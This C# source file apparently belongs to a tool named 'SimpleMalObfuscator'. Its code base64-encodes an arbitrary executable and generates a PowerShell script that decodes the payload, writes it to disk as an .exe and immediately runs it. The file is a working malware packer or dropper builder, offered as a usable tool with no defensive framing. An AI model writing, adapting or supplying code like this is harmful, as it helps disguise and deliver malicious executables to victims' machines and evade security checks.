namespace SimpleMalObfuscator.Core
{
    public static class Ofuscator
    {
        public static string ConvertBinToBase64(string path)
        {
            if (File.Exists(path))
            {
                var binContents = GetBinContent(path);
                var base64Str = Convert.ToBase64String(binContents);
                return base64Str;
            }
            else
            {
                throw new Exception($"[Convert to Base64] File Not Found: {path}");
            }
        }

        public static void SaveToPS1(string base64Content, string outFile)
        {
            try
            {
                var ps1Content = $@"$payload = @""
{base64Content}
""@
$bytes = [System.Convert]::FromBase64String($payload)
[System.IO.File]::WriteAllBytes('{outFile.Replace(".ps1", "")}.exe', $bytes)
Start-Process '{outFile.Replace(".ps1", "")}.exe'";

                var outFileName = $"{outFile}".Replace(".ps1", "");
                File.WriteAllText($"{outFileName}.ps1", ps1Content);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"File saved to {outFileName}");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(ex.Message);
            }

        }

        public static byte[] GetBinContent(string path)
        {
            if (File.Exists(path))
            {
                return File.ReadAllBytes(path);
            }
            else
            {
                throw new Exception($"[Read Bin Content] File not found: {path}");
            }
        }
    }
}
